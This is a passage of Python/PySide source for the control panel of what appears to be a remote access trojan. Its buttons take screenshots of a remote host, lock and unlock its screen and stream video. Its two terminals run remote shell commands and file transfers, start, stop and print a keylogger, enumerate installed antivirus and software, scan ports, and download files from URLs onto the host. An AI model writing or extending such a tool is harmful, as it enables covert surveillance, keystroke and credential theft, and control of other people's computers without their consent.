        self.lineEdit_2.setStyleSheet(u"QLineEdit {\n"
                                      "	background-color: rgb(27, 29, 35);\n"
                                      "	border-radius: 5px;\n"
                                      "	border: 2px solid rgb(27, 29, 35);\n"
                                      "	padding-left: 10px;\n"
                                      "}")

        self.verticalLayout_6.addWidget(self.lineEdit_2)


        self.gridLayout_3.addLayout(self.verticalLayout_6, 0, 0, 4, 1)

        self.verticalLayout_7 = QVBoxLayout()
        self.verticalLayout_7.setSpacing(8)
        self.verticalLayout_7.setObjectName(u"verticalLayout_7")
        self.verticalLayout_7.setContentsMargins(0, 2, 0, 0)

        self.gridLayout_3.addLayout(self.verticalLayout_7, 0, 1, 4, 1)

        self.gridLayout.addWidget(self.frame_4, 0, 0, 1, 1)

        self.gridLayout_4.addLayout(self.gridLayout, 6, 0, 1, 1)

        self.frame = QFrame(self.page_widgets)
        self.frame.setObjectName(u"frame")
        self.frame.setMinimumSize(QSize(122, 320))
        self.frame.setMaximumSize(QSize(16777215, 16777215))
        self.frame.setStyleSheet(u"background-color: rgb(27, 29, 35);\n"
                                 "border-radius: 5px;\n")
        self.frame.setFrameShape(QFrame.StyledPanel)
        self.frame.setFrameShadow(QFrame.Raised)
        self.verticalLayout_15 = QVBoxLayout(self.frame)
        self.verticalLayout_15.setSpacing(0)
        self.verticalLayout_15.setObjectName(u"verticalLayout_15")
        self.verticalLayout_15.setContentsMargins(0, 0, 0, 0)

        self.gridLayout_4.addWidget(self.frame, 0, 0, 5, 1)

        self.horizontalLayout_9 = QHBoxLayout()
        self.horizontalLayout_9.setSpacing(0)
        self.horizontalLayout_9.setObjectName(u"horizontalLayout_9")
        self.horizontalLayout_9.setContentsMargins(0, 0, 0, 0)
        self.frame_div_content_2 = QFrame(self.page_widgets)
        self.frame_div_content_2.setObjectName(u"frame_div_content_2")
        self.frame_div_content_2.setMinimumSize(QSize(300, 590))
        self.frame_div_content_2.setMaximumSize(QSize(16777215, 16777215))
        self.frame_div_content_2.setStyleSheet(u"background-color: rgb(41, 45, 56);\n"
                                               "border-radius: 5px;\n"
                                               "")
        self.frame_div_content_2.setFrameShape(QFrame.NoFrame)
        self.frame_div_content_2.setFrameShadow(QFrame.Raised)
        self.verticalLayout_12 = QVBoxLayout(self.frame_div_content_2)
        self.verticalLayout_12.setSpacing(0)
        self.verticalLayout_12.setObjectName(u"verticalLayout_12")
        self.verticalLayout_12.setContentsMargins(0, 0, 0, 0)
        self.scrollArea = QScrollArea(self.frame_div_content_2)
        self.scrollArea.setObjectName(u"scrollArea")
        self.scrollArea.setStyleSheet(u"background-color: rgb(27, 29, 35);\n"
                                      "border-radius: 5px;\n"
                                      "")
        self.scrollArea.setWidgetResizable(True)
        self.scrollAreaWidgetContents_2 = QWidget()
        self.scrollAreaWidgetContents_2.setObjectName(u"scrollAreaWidgetContents_2")
        self.scrollAreaWidgetContents_2.setGeometry(QRect(0, 0, 300, 553))
        self.gridLayout_6 = QGridLayout(self.scrollAreaWidgetContents_2)
        self.gridLayout_6.setObjectName(u"gridLayout_6")
        self.system_terminal = QLabel(self.scrollAreaWidgetContents_2)
        self.system_terminal.setObjectName(u"label_2")
        self.system_terminal.setAlignment(Qt.AlignLeading | Qt.AlignLeft | Qt.AlignTop)

        self.gridLayout_6.addWidget(self.system_terminal, 0, 0, 1, 1)

        self.scrollArea.setWidget(self.scrollAreaWidgetContents_2)

        self.verticalLayout_12.addWidget(self.scrollArea)

        self.verticalSpacer = QSpacerItem(7, 7, QSizePolicy.Minimum, QSizePolicy.Fixed)

        self.verticalLayout_12.addItem(self.verticalSpacer)

        self.lineEdit = QLineEdit(self.frame_div_content_2)
        self.lineEdit.setObjectName(u"lineEdit")
        self.lineEdit.setMinimumSize(QSize(0, 30))
        self.lineEdit.setStyleSheet(u"QLineEdit {\n"
                                    "	background-color: rgb(27, 29, 35);\n"
                                    "	border-radius: 5px;\n"
                                    "	border: 2px solid rgb(27, 29, 35);\n"
                                    "	padding-left: 10px;\n"
                                    "}\n"
                                    "")

        self.verticalLayout_12.addWidget(self.lineEdit)

        self.horizontalLayout_9.addWidget(self.frame_div_content_2)

        self.gridLayout_4.addLayout(self.horizontalLayout_9, 0, 1, 7, 3)

        self.frame_3 = QFrame(self.page_widgets)
        self.frame_3.setObjectName(u"frame_3")
        self.frame_3.setMinimumSize(QSize(0, 0))
        self.frame_3.setMaximumSize(QSize(16777215, 32))
        self.frame_3.setStyleSheet(u"border-radius: 5px;")
        self.frame_3.setFrameShape(QFrame.StyledPanel)
        self.frame_3.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_13 = QHBoxLayout(self.frame_3)
        self.horizontalLayout_13.setSpacing(5)
        self.horizontalLayout_13.setObjectName(u"horizontalLayout_13")
        self.horizontalLayout_13.setContentsMargins(0, 1, 0, 9)
        self.toolButton_4 = QToolButton(self.frame_3)
        self.toolButton_4.setObjectName(u"toolButton_4")
        self.toolButton_4.setMinimumSize(QSize(90, 30))
        self.toolButton_4.setMaximumSize(QSize(16777215, 30))
        self.toolButton_4.setCursor(QCursor(Qt.PointingHandCursor))
        self.toolButton_4.setStyleSheet(u"background-position: left center;\n"
                                        "background-repeat: no-repeat;\n"
                                        "border: none;\n"
                                        "background-color: rgb(27, 29, 35);\n"
                                        "border-radius: 5px;")
        icon3 = QIcon()
        icon3.addFile(u":/24x24/icons/24x24/cil-reload.png", QSize(), QIcon.Normal, QIcon.Off)
        self.toolButton_4.setIcon(icon3)

        self.horizontalLayout_13.addWidget(self.toolButton_4)

        self.toolButton = QToolButton(self.frame_3)
        self.toolButton.setObjectName(u"toolButton")
        self.toolButton.setMinimumSize(QSize(90, 30))
        self.toolButton.setMaximumSize(QSize(16777215, 30))
        self.toolButton.setCursor(QCursor(Qt.PointingHandCursor))
        self.toolButton.setStyleSheet(u"background-position: left center;\n"
                                      "background-repeat: no-repeat;\n"
                                      "border: none;\n"
                                      "background-color: rgb(27, 29, 35);\n"
                                      "border-radius: 5px;")
        icon4 = QIcon()
        icon4.addFile(u":/24x24/icons/24x24/cil-lock-locked.png", QSize(), QIcon.Normal, QIcon.Off)
        self.toolButton.setIcon(icon4)

        self.horizontalLayout_13.addWidget(self.toolButton)

        self.toolButton_2 = QToolButton(self.frame_3)
        self.toolButton_2.setObjectName(u"toolButton_2")
        self.toolButton_2.setMinimumSize(QSize(90, 30))
        self.toolButton_2.setMaximumSize(QSize(16777215, 30))
        self.toolButton_2.setCursor(QCursor(Qt.PointingHandCursor))
        self.toolButton_2.setStyleSheet(u"background-position: left center;\n"
                                        "background-repeat: no-repeat;\n"
                                        "border: none;\n"
                                        "background-color: rgb(27, 29, 35);\n"
                                        "border-radius: 5px;")
        icon5 = QIcon()
        icon5.addFile(u":/24x24/icons/24x24/cil-lock-unlocked.png", QSize(), QIcon.Normal, QIcon.Off)
        self.toolButton_2.setIcon(icon5)

        self.horizontalLayout_13.addWidget(self.toolButton_2)

        #self.toolButton_8 = QToolButton(self.frame_3)
        #self.toolButton_8.setObjectName(u"toolButton_8")
        #self.toolButton_8.setMinimumSize(QSize(78, 30))
        #self.toolButton_8.setMaximumSize(QSize(16777215, 30))
        #self.toolButton_8.setCursor(QCursor(Qt.PointingHandCursor))
        #self.toolButton_8.setStyleSheet(u"background-position: left center;\n"
        #                                "background-repeat: no-repeat;\n"
        #                                "border: none;\n"
        #                                "background-color: rgb(27, 29, 35);\n"
        #                                "border-radius: 5px;")
        #icon6 = QIcon()
        #icon6.addFile(u":/24x24/icons/24x24/cil-touch-app.png", QSize(), QIcon.Normal, QIcon.Off)
        #self.toolButton_8.setIcon(icon6)
        #self.toolButton_8.setIconSize(QSize(17, 17))

        #self.horizontalLayout_13.addWidget(self.toolButton_8)

        self.toolButton_3 = QToolButton(self.frame_3)
        self.toolButton_3.setObjectName(u"toolButton_3")
        self.toolButton_3.setMinimumSize(QSize(90, 30))
        self.toolButton_3.setMaximumSize(QSize(16777215, 30))
        self.toolButton_3.setCursor(QCursor(Qt.PointingHandCursor))
        self.toolButton_3.setStyleSheet(u"background-position: left center;\n"
                                        "background-repeat: no-repeat;\n"
                                        "border: none;\n"
                                        "background-color: rgb(27, 29, 35);\n"
                                        "border-radius: 5px;")
        icon7 = QIcon()
        icon7.addFile(u":/24x24/icons/24x24/cil-camera.png", QSize(), QIcon.Normal, QIcon.Off)
        self.toolButton_3.setIcon(icon7)

        self.horizontalLayout_13.addWidget(self.toolButton_3)

        self.toolButton_5 = QToolButton(self.frame_3)
        self.toolButton_5.setObjectName(u"toolButton_5")
        self.toolButton_5.setMinimumSize(QSize(100, 30))
        self.toolButton_5.setMaximumSize(QSize(16777215, 30))
        self.toolButton_5.setCursor(QCursor(Qt.PointingHandCursor))
        self.toolButton_5.setStyleSheet(u"background-position: left center;\n"
                                        "background-repeat: no-repeat;\n"
                                        "border: none;\n"
                                        "background-color: rgb(27, 29, 35);\n"
                                        "border-radius: 5px;")
        icon8 = QIcon()
        icon8.addFile(u":/24x24/icons/24x24/cil-video.png", QSize(), QIcon.Normal, QIcon.Off)
        self.toolButton_5.setIcon(icon8)
        self.toolButton_5.setIconSize(QSize(17, 16))

        self.horizontalLayout_13.addWidget(self.toolButton_5)

        self.gridLayout_4.addWidget(self.frame_3, 5, 0, 1, 1)

        self.stackedWidget.addWidget(self.page_widgets)

        self.verticalLayout_9.addWidget(self.stackedWidget)

        self.verticalLayout_4.addWidget(self.frame_content)

        self.frame_grip = QFrame(self.frame_content_right)
        self.frame_grip.setObjectName(u"frame_grip")
        self.frame_grip.setMinimumSize(QSize(0, 25))
        self.frame_grip.setMaximumSize(QSize(16777215, 25))
        self.frame_grip.setStyleSheet(u"background-color: rgb(33, 37, 43);")
        self.frame_grip.setFrameShape(QFrame.NoFrame)
        self.frame_grip.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_6 = QHBoxLayout(self.frame_grip)
        self.horizontalLayout_6.setSpacing(0)
        self.horizontalLayout_6.setObjectName(u"horizontalLayout_6")
        self.horizontalLayout_6.setContentsMargins(0, 0, 2, 0)
        self.frame_label_bottom = QFrame(self.frame_grip)
        self.frame_label_bottom.setObjectName(u"frame_label_bottom")
        self.frame_label_bottom.setFrameShape(QFrame.NoFrame)
        self.frame_label_bottom.setFrameShadow(QFrame.Raised)
        self.horizontalLayout_7 = QHBoxLayout(self.frame_label_bottom)
        self.horizontalLayout_7.setSpacing(0)
        self.horizontalLayout_7.setObjectName(u"horizontalLayout_7")
        self.horizontalLayout_7.setContentsMargins(10, 0, 10, 0)
        self.label_credits = QLabel(self.frame_label_bottom)
        self.label_credits.setObjectName(u"label_credits")
        self.label_credits.setFont(font2)
        self.label_credits.setStyleSheet(u"color: rgb(98, 103, 111);")

        self.horizontalLayout_7.addWidget(self.label_credits)

        #self.host_terminal.setTextInteractionFlags(Qt.TextSelectableByMouse)
        #self.system_terminal.setTextInteractionFlags(Qt.TextSelectableByMouse)

        self.label_version = QLabel(self.frame_label_bottom)
        self.label_version.setObjectName(u"label_version")
        self.label_version.setMaximumSize(QSize(100, 16777215))
        self.label_version.setFont(font2)
        self.label_version.setStyleSheet(u"color: rgb(98, 103, 111);")
        self.label_version.setAlignment(Qt.AlignRight | Qt.AlignTrailing | Qt.AlignVCenter)

        self.horizontalLayout_7.addWidget(self.label_version)

        self.horizontalLayout_6.addWidget(self.frame_label_bottom)

        self.frame_size_grip = QFrame(self.frame_grip)
        self.frame_size_grip.setObjectName(u"frame_size_grip")
        self.frame_size_grip.setMaximumSize(QSize(20, 20))
        self.frame_size_grip.setStyleSheet(u"QSizeGrip {\n"
                                           "	background-image: url(:/16x16/icons/16x16/cil-size-grip.png);\n"
                                           "	background-position: center;\n"
                                           "	background-repeat: no-reperat;\n"
                                           "}")
        self.frame_size_grip.setFrameShape(QFrame.NoFrame)
        self.frame_size_grip.setFrameShadow(QFrame.Raised)

        self.horizontalLayout_6.addWidget(self.frame_size_grip)

        self.verticalLayout_4.addWidget(self.frame_grip)

        self.horizontalLayout_2.addWidget(self.frame_content_right)

        self.verticalLayout.addWidget(self.frame_center)

        self.horizontalLayout.addWidget(self.frame_main)

        MainWindow.setCentralWidget(self.centralwidget)
        QWidget.setTabOrder(self.btn_minimize, self.btn_maximize_restore)
        QWidget.setTabOrder(self.btn_maximize_restore, self.btn_close)

        self.retranslateUi(MainWindow)

        self.stackedWidget.setCurrentIndex(1)

        QMetaObject.connectSlotsByName(MainWindow)
    # setupUi
        ########### SIZE/FONT ######################
        try:
            with open('bin/profile/hs_size.txt', 'r') as hssr:
                set_hssr = hssr.read()
                self.host_terminal.setStyleSheet(f'font-size: {int(set_hssr)}px;')

        except:
            self.label.setStyleSheet(f'font-size: {int(set_hssr)}px;')

        try:
            with open('bin/profile/st_size.txt', 'r') as sssr:
                set_sssr = sssr.read()
                self.system_terminal.setStyleSheet(f'font-size: {int(set_sssr)}px;')

        except:
            self.system_terminal.setStyleSheet(f'font-size: {11}px;')

        self.frame_div_content_2.setMinimumSize(QSize(300, 590))
        self.frame_div_content_2.setMaximumSize(QSize(16777215, 16777215))

        self.frame.setMinimumSize(QSize(549, 322))
        self.frame.setMaximumSize(QSize(549, 16777215))

        self.scrollArea.setMinimumSize(QSize(300, 550))
        self.scrollArea.setMaximumSize(QSize(16777215, 16777215))

        self.scrollArea_2.setMinimumSize(QSize(16777215, 183))
        self.scrollArea_2.setMaximumSize(QSize(16777215, 183))

        self.lineEdit_2.setMinimumSize(QSize(490, 30))

        self.frame_3.setMinimumSize(QSize(0, 32))
        self.frame_3.setMaximumSize(QSize(560, 32))

        self.frame_4.setMaximumSize(QSize(16777215, 222))
        self.frame_4.setMaximumSize(QSize(547, 16777215))

        ########### PIXMAP ######################

        self.gridLayoutPixMap = QGridLayout()
        self.gridLayoutPixMap.setObjectName(u"gridLayoutPixMap")
        self.label_23 = QLabel(self.frame)
        self.label_23.setObjectName(u"label_23")

        self.gridLayoutPixMap.addWidget(self.label_23, 0, 0, 1, 1)

        self.verticalLayout_15.addLayout(self.gridLayoutPixMap)

        self.label_23 = QLabel(self.frame)
        self.label_23.setObjectName(u"label_23")

        self.gridLayoutPixMap.addWidget(self.label_23, 0, 0, 1, 1)
        self.label_23.setText(QCoreApplication.translate("MainWindow", u"TextLabel", None))

        self.pixmap = QtGui.QPixmap('icons/others/no-image-avaliable.png')
        self.label_23.setPixmap(self.pixmap)
        self.label_23.setScaledContents(True)

        self.label_23.mousePressEvent = self.getPos

        #########################################################################################

        self.lineEdit.returnPressed.connect(self.call_sc)
        self.lineEdit_2.returnPressed.connect(self.katana_shell)
        self.system_terminal.setTextInteractionFlags(Qt.TextSelectableByMouse)
        self.host_terminal.setTextInteractionFlags(Qt.TextSelectableByMouse)
        self.system_terminal.setCursor(QCursor(QtCore.Qt.IBeamCursor))
        self.host_terminal.setCursor(QCursor(QtCore.Qt.IBeamCursor))

        # Connecting the button functions

        # Update screenshot button
        self.toolButton_4.clicked.connect(self.th_us)

        # Save screenshot button
        self.toolButton_3.clicked.connect(self.th_ss)

        # Lock screen button
        self.toolButton.clicked.connect(self.th_ls)

        # Unlock screen button
        self.toolButton_2.clicked.connect(self.th_uls)

        # Start video-streaming button
        self.toolButton_5.clicked.connect(self.th_vs)

        self.record_status = False
        self.start_video_save_status = False
        self.video_start_status = False

        my_font = QFont('Consolas', 12)
        self.system_terminal.setFont(my_font)
        self.host_terminal.setFont(my_font)
        self.lineEdit_2.setFont(my_font)
        self.lineEdit.setFont(my_font)

        self.system_terminal.setText('Type "-help" for more information.\n')
        self.host_terminal.setText('Type "-help" for more information.\n')

        self.terminal_history = []
        self.host_history = []
        self.list_commands = [
                        "\nThis is a synchronized terminal with host, you can type commands \nlike a terminal. Another reserved commands:\n",
                        "\n-help                                        Displays this help.\n",
                        "-clear                                       Clears the terminal.\n",
                        "-fontsize <int>                              Sets the font size.\n",
                        "-restart                                     Restarts the script of host.\n",
                        "-print                                       Saves the terminal output to a text file.\n",
                        "-history                                     Shows the history of commands.\n",
                        "-restore                                     Restores the last STDOUT.\n",
                        "-fput <server_path> /: <client_path>         Upload a file to client host.\n",
                        "-fget <client_path> /: <server_path>         Downloads a file from client host.\n"]

        self.list_commands_host = [
                            "\nThis is a lite terminal, you can do some extra functions:\n",
                             "\n-help                                Displays this help.\n",
                             "-clear                               Clears the terminal\n",
                             "-info                                Shows informations about host.\n",
                             "-fontsize <int>                      Sets the font size.\n",
                             "-history                             Shows the history of commands.\n",
                             "-portscan                            Shows all opened ports on host.\n"
                             "-updates                             Get a list of installed update (only windows)\n",
                             "-antivirus                           Lists the installed Antivirus on host (only windows).\n"
                             "-softwares                           Lists the installed softwares on host.\n",
                             "-keylogger start                     Start the keylogger function.\n",
                             "-keylogger stop                      Stop the keylogger function.\n",
                             "-keylogger print                     Shows the keylogger log.\n",
                             "-webget <URL> -f <file_path>         Download a file from URL.\n",
                             "-webraw <URL> -f <file_path>         Download content from raw page.\n",
                             "-svideosize <width>:<height>         Sets the size of stream window.\n"]

    def keyPressEvent(self, e):
        """
        Ignore it.
        """
        return

    def keyReleaseEvent(self, event):
        """
        Ignore it.
        """
        if self.focusWidget().objectName() == 'lineEdit':
            if event.key() == Qt.Key_Down:
                print('baixo')

            elif event.key() == Qt.Key_Up:
                print('cima')

        else:
            super().keyPressEvent(event)

    def th_vs(self):
        """
        Creates a threading process with video_start function.
        """
        threadd = threading.Thread(target=self.video_start, args=())
        threadd.daemon = True
        threadd.start()

    def video_start(self):
        self.call_sc(st_strm=True)

    def th_cs(self):
        """
        Creates a threading process with control_screen function.
        """
        if not self.record_status:
            self.record_status = True
        else:
            self.record_status = False
            return

        threadd = threading.Thread(target=self.control_screen, args=())
        threadd.daemon = True
        threadd.start()

    def control_screen(self):
        """
        Ignore it.
        """
        while self.record_status:
            coordinates = pyautogui.position()
            coordinates = str(coordinates).replace('Point(x=', '').replace('y=', '').replace(')', '').replace(' ', '')
            set_coordinates = f'[COORDINATES]{coordinates}'
            self.call_sc(coordinates=set_coordinates)
            time.sleep(1)

    def getPos(self, event):
        """
        Ignore it.
        """
        x = event.pos().x()
        y = event.pos().y()
        print(x, y)

    def th_uls(self):
        """
        Creates a threading process with unlock_screen function.
        """
        self.toolButton_2.setEnabled(False)
        threadd = threading.Thread(target=self.unlock_screen, args=())
        threadd.daemon = True
        threadd.start()

    def unlock_screen(self):
        self.call_sc(sculk=True)
        self.toolButton_2.setEnabled(True)

    def th_ls(self):
        """
        Creates a threading process with lock_screen function.
        """
        self.toolButton.setEnabled(False)
        threadd = threading.Thread(target=self.lock_screen, args=())
        threadd.daemon = True
        threadd.start()

    def lock_screen(self):
        self.call_sc(sclk=True)
        self.toolButton.setEnabled(True)

    def th_ss(self):
        """
        Sets the path that will saved the screenshot and Creates a threading process with save_screenshot function.
        """
        self.toolButton_3.setEnabled(False)
        self.path_image = QtWidgets.QFileDialog.getSaveFileName()[0]
        threadd = threading.Thread(target=self.save_screenshot, args=())
        threadd.daemon = True
        threadd.start()

    def save_screenshot(self):
        """
        Calls the call_sc function and wait the file transfer to save the screenshot in the path variable.
        """
        self.call_sc(btn_scr=True)
        time.sleep(10)

        try:
            if os.path.isfile(f'bin/resources/cache/screenshot_{self.hselected}.png'):
                with open(f'bin/resources/cache/screenshot_{self.hselected}.png', 'rb') as read_img:
                    content_print = read_img.read()

                with open(f'{self.path_image}.png', 'wb') as save_img:
                    save_img.write(content_print)
                print(3)
                #os.remove(f'bin/resources/cache/screenshot_{self.hselected}.png')

            else:
                try:
                    #os.remove(f'bin/resources/cache/screenshot_{self.hselected}.png')
                    pass

                except:
                    pass

        except Exception as exception:
            print("Exception: {}".format(type(exception).__name__))
            print("Exception message: {}".format(exception))

        self.toolButton_3.setEnabled(True)

    def th_us(self):
        """
        Creates a threading process with update_screenshot function.
        """
        threadd = threading.Thread(target=self.update_screenshot, args=())
        threadd.daemon = True
        threadd.start()

    def update_screenshot(self, sv_status='False'):
        """
        Calls the call_sc function and wait the file transfer to update the screenshot on the painel.
        """
        try:
            self.call_sc(btn_scr=True)
            time.sleep(9)
        except:
            pass

        try:
            path = f'bin/resources/cache/screenshot_{self.hselected}.png'
            self.pixmap = QtGui.QPixmap(path)
            self.label_23.setPixmap(self.pixmap)
            self.label_23.setScaledContents(True)

        except:
            pass

    def save_ks(self):
        """
        Saves the output of terminal to a text file.
        """
        file_name = QtWidgets.QFileDialog.getSaveFileName()[0]
        with open(f'{file_name}.txt', 'w') as save_output:
            try:
                save_output.write(self.host_terminal.text())
            except:
                pass
            save_output.close()

    def katana_shell(self):
        """
        Katana Shell represent the lite terminal. When the lite terminal is invoked with a command this function
        is invoked.
        """

        current_call = str(self.lineEdit_2.displayText()).lstrip()
        gtsv = self.host_terminal.text()

        if gtsv == '' or gtsv == ' ':
            self.host_terminal.setText(f'>>> {current_call}\n')
        else:
            self.host_terminal.setText(f'{gtsv}\n>>> {current_call}\n')

        if current_call == '' or current_call == ' ' or current_call == '  ':
            return

        now = datetime.datetime.now()
        now_minute = now.minute

        if len(str(now_minute)) == 1:
            now_minute = '0' + str(now_minute)
        append_history = f'{now.hour}:{now_minute}   {current_call}'
        self.host_history.insert(len(self.host_history), append_history)

        if self.lineEdit_2.displayText() == '-clear' or self.lineEdit_2.displayText() == 'clear':
            self.host_terminal.clear()
            self.lineEdit_2.clear()
            return

        elif self.lineEdit_2.displayText() == '-history':
            self.lineEdit_2.clear()

            if self.host_history == []:
                return

            final_string = ''
            for item in self.host_history:
                final_string += f'{item}\n'

            gcfi = self.host_terminal.text()
            if gcfi == '' or gcfi == ' ':
                self.host_terminal.setText(f'{final_string}\n')
            else:
                self.host_terminal.setText(f'{gcfi}\n{final_string}')
            return

        elif self.lineEdit_2.displayText().startswith('-svideosize'):
            with open('bin/profile/vstream_size.txt', 'w') as f:
                f.write(self.lineEdit_2.text().replace('-svideosize ', '').rstrip().lstrip())
            self.lineEdit_2.clear()
            return

        elif self.lineEdit_2.displayText().startswith('-fontsize'):
            fsize = str(self.lineEdit_2.displayText()).replace('-fontsize', '').replace(' ','')
            self.lineEdit_2.clear()

            try:
                self.host_terminal.setStyleSheet(f'font-size: {int(fsize)}px;')
                with open('bin/profile/hs_size.txt', 'w') as hss:
                    hss.write(fsize)
            except:
                pass

            return

        elif self.lineEdit_2.displayText() == '-help':
            chtg = self.host_terminal.text()

            if chtg == '' or chtg == ' ':
                for e in self.list_commands_host:
                    chtg = self.host_terminal.text()
                    self.host_terminal.setText(f"{e}")

            else:
                for e in self.list_commands_host:
                    chtg = self.host_terminal.text()
                    self.host_terminal.setText(f"{chtg}{e}")

            self.lineEdit_2.clear()
            return

        elif self.lineEdit_2.displayText() == '-info':
            with open(f'bin/hosts/{self.hselected}.txt', 'r') as info_about_host:
                get_info = info_about_host.read()
                info_about_host.close()

            get_info = get_info.split('\n')
            cont_l = ''

            for info_exp in get_info:
                if info_exp != '' and info_exp != ' ' and info_exp != 'system_info':
                    info_exp = info_exp.replace(":", ": ")
                    cont_l += info_exp + '\n'

            ctls = self.host_terminal.text()

            if ctls == '' or ctls == ' ':
                self.host_terminal.setText(f'{cont_l}')
            else:
                self.host_terminal.setText(f'{ctls}\n{cont_l}')
            #self.plainTextEdit.insertPlainText(f"{''.join([chr(13)])}")
            self.lineEdit_2.clear()

        elif self.lineEdit_2.text() == '-updates':
            self.call_sc(upd=True)
            gcts = self.host_terminal.text()
            if gcts == '' or gcts == ' ':
                self.host_terminal.setText(
                    f'Requesting for update list, please wait.\n')
            else:
                self.host_terminal.setText(
                    f'{gcts}\nRequesting for update list, please wait.\n')
            self.lineEdit_2.clear()

        elif '-portscan' in self.lineEdit_2.text():
            self.port_scan = self.lineEdit_2.text()
            self.call_sc(port=True)
            gcts = self.host_terminal.text()
            if gcts == self.host_terminal.text():
                self.host_terminal.setText(
                    f'Looking for opened ports, Please wait.\n')
            else:
                self.host_terminal.setText(
                    f'Looking for opened ports, Please wait.\n')
            self.lineEdit_2.clear()

        elif self.lineEdit_2.text() == '-antivirus':
            self.call_sc(ant=True)
            gcts = self.host_terminal.text()
            if gcts == '' or gcts == ' ':
                self.host_terminal.setText(
                    f'Requesting for antivirus list, please wait.\n')
            else:
                self.host_terminal.setText(
                    f'{gcts}\nRequesting for antivirus list, please wait.\n')
            self.lineEdit_2.clear()

        elif self.lineEdit_2.text() == '-softwares':
            self.call_sc(soft_list=True)
            gcts = self.host_terminal.text()
            if gcts == '' or gcts == ' ':
                self.host_terminal.setText(
                    f'Requesting for softwares list, please wait.\n')
            else:
                self.host_terminal.setText(
                    f'{gcts}\nRequesting for softwares list, please wait.\n')
            self.lineEdit_2.clear()

        elif self.lineEdit_2.text().startswith('-webget'):
            self.call_sc(wget='[@%WEBGET%@]' + self.lineEdit_2.text())
            self.lineEdit_2.clear()

        elif self.lineEdit_2.text().startswith('-webraw'):
            self.call_sc(wraw='[@%WEBRAW%@]' + self.lineEdit_2.text())
            self.lineEdit_2.clear()

        elif self.lineEdit_2.text() == '-keylogger start':
            self.call_sc(kl_start=True)
            gcts = self.host_terminal.text()
            if gcts == '' or gcts == ' ':
                self.host_terminal.setText(
                    f'Keylogger function will be started.\n')
            else:
                self.host_terminal.setText(
                    f'{gcts}\nKeylogger function will be started.\n')
            self.lineEdit_2.clear()

        elif self.lineEdit_2.text() == '-keylogger stop':
            self.call_sc(kl_stop=True)
            gcts = self.host_terminal.text()
            if gcts == '' or gcts == ' ':
                self.host_terminal.setText(
                    f'Keylogger function will be stopped.\n')
            else:
                self.host_terminal.setText(
                    f'{gcts}\nKeylogger function will be stopped.\n')
            self.lineEdit_2.clear()

        elif self.lineEdit_2.text() == '-keylogger print':
            self.call_sc(kl_print=True)
            gcts = self.host_terminal.text()
            if gcts == '' or gcts == ' ':
                self.host_terminal.setText(
                    f'Trying to open the keylogger log.\n')
            else:
                self.host_terminal.setText(
                    f'{gcts}\nTrying to open the keylogger log.\n')
            self.lineEdit_2.clear()

        else:
            gctfs = self.host_terminal.text()
            if gctfs == '' or gctfs == ' ':
                self.host_terminal.setText(f'Invalid command or syntax, please try again. For more informations type "-help".\n')
            else:
                self.host_terminal.setText(f'{gctfs}\nInvalid command or syntax, please try again. For more informations type "-help".\n')
            self.lineEdit_2.clear()
            return


    def call_sc(self, btn_scr=False, sclk=False, sculk=False, coordinates=None, rec_start=False, rec_stop=False
                , rec_get=False, st_strm=False, live_video=False, kl_start=False, kl_stop=False, kl_print=False,
                soft_list=False, wget=False, wraw=False, ant=False, upd=False, port=False):
        """
        The call_sc is responsible to write the command to the STDIN file of host "/bin/request/transfer/stdout/<tag>"
        and invoke the 'execute' "/bin/request/transfer/execute/<tag>" (if execute file is True the server will send the
        command, if the execute is False the server don't send any command).

        So, the function will verify the STDOUT file of host "/bin/request/transfer/stdin/<tag>" for check if the response
        of client was received.

        If the response of client was received it will write in the terminal output.
        """

        current_call = str(self.lineEdit.displayText())
        gotps = self.system_terminal.text()
        now = datetime.datetime.now()
        now_minute = now.minute

        if port or upd or ant or btn_scr or sclk or sculk or st_strm or soft_list or wget or wraw or kl_stop or kl_start or kl_print:
            current_call = 'ignore'

        if not port and not upd and not ant and not kl_start and not kl_stop and not kl_print and not soft_list and not wget and not wraw and not btn_scr and not sclk and not sculk\
                and not st_strm:
            if gotps == '' or gotps == ' ':
                self.system_terminal.setText(f'>>> {current_call}\n')
            else:
                self.system_terminal.setText(f'{gotps}\n>>> {current_call}\n')

        if current_call == '' or current_call == ' ' or current_call == '   ':
            return

        if len(str(now_minute)) == 1:
            now_minute = '0' + str(now_minute)
        append_history = f'{now.hour}:{now_minute}   {current_call}'
        self.terminal_history.insert(len(self.terminal_history), append_history)

        if self.lineEdit.displayText() == '-clear' or self.lineEdit.displayText() == 'clear':
            self.lineEdit.clear()
            self.system_terminal.clear()
            return

        if self.lineEdit.displayText() == '-print' or self.lineEdit.displayText() == '-print ':
            self.path_image = QtWidgets.QFileDialog.getSaveFileName()[0]
            with open(self.path_image + '.txt', 'w') as svstd:
                self.lineEdit.clear()
                svstd.write(self.system_terminal.text())
                svstd.close()
            return

        if self.lineEdit.displayText() == '-help':
            self.lineEdit.clear()
            gcfi = self.system_terminal.text()
            if gcfi == '' or gcfi == ' ':
                for e in self.list_commands:
                    gcfi = self.system_terminal.text()
                    self.system_terminal.setText(f'{gcfi}{e}')
            else:
                for e in self.list_commands:
                    gcfi = self.system_terminal.text()
                    self.system_terminal.setText(f'{gcfi}{e}')
            return

        if self.lineEdit.displayText() == '-history':
            self.lineEdit.clear()

            if self.terminal_history == []:
                return

            final_string = ''
            for item in self.terminal_history:
                final_string += f'{item}\n'

            gcfi = self.system_terminal.text()
            if gcfi == '' or gcfi == ' ':
                self.system_terminal.setText(f'{final_string}\n')
            else:
                self.system_terminal.setText(f'{gcfi}\n{final_string}')
            return

        if self.lineEdit.displayText() == '-restart':
            gcfi = self.system_terminal.text()
            if gcfi == '' or gcfi == ' ':
                self.system_terminal.setText(f'The script of host will be restarted, please wait.\n')
            else:
                self.system_terminal.setText(f'{gcfi}\nThe script of host will be restarted, please wait.\n')

        if self.lineEdit.displayText().startswith('-fget'):
            gcfi = self.system_terminal.text()
            if gcfi == '' or gcfi == ' ':
                self.system_terminal.setText(f'The file will be downloaded, please wait.\n')
            else:
                self.system_terminal.setText(f'{gcfi}\nThe file will be downloaded, please wait.\n')

        if self.lineEdit.displayText().startswith('-fput'):
            gcfi = self.system_terminal.text()
            if gcfi == '' or gcfi == ' ':
                self.system_terminal.setText(f'The file will be uploaded, please wait.\n')
            else:
                self.system_terminal.setText(f'{gcfi}\nThe file will be uploaded, please wait.\n')


        if self.lineEdit.displayText().startswith('-fontsize'):
            fsize = str(self.lineEdit.displayText()).replace('-fontsize', '').replace(' ','')
            self.lineEdit.clear()
